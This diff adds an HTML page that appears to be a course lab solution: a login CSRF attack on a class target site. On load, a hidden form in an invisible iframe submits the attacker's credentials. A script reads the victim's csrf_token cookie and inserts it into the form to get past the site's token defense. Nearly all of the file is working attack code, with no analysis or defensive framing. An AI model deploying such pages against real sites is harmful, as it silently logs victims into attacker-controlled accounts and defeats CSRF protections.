@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <!--<iframe name="xss-frame" style="display: none;" id="attack_frame" src="http://cpsc4200.mpese.com/login?csrfdefense=1&xssdefense=0"></iframe>-->
+    <iframe name="attack_frame" style="position: absolute;width:0;height:0;border:0;"></iframe>
+
+     <form method="POST" action="http://cpsc4200.mpese.com/login?csrfdefense=1&xssdefense=0" id="csrf_attack" target="attack_frame"> 
+        <input type="hidden" name="username" value="attacker" />
+        <input type="hidden" name="password" value="l33th4x" />
+        <input type="hidden" name="csrf_token" id="token">
+    </form>
+
+    <script>
+        //get cookie function from stack overflow
+        function getCookie(name) {
+            // Split cookie string and get all individual name=value pairs in an array
+            var cookieArr = document.cookie.split(";");
+            
+            // Loop through the array elements
+            for(var i = 0; i < cookieArr.length; i++) {
+                var cookiePair = cookieArr[i].split("=");
+                
+                /* Removing whitespace at the beginning of the cookie name
+                and compare it with the given string */
+                if(name == cookiePair[0].trim()) {
+                    // Decode the cookie value and return
+                    return decodeURIComponent(cookiePair[1]);
+                }
+            }
+            
+            // Return null if not found
+            return null;
+        }
+     
+
+        var cookie = getCookie("csrf_token");
+        console.log(cookie);
+        document.getElementById("token").value = cookie;
+    </script>
+
+
+    <script>
+        document.getElementById("csrf_attack").submit();
+    </script>
+</body>
+
+</html>
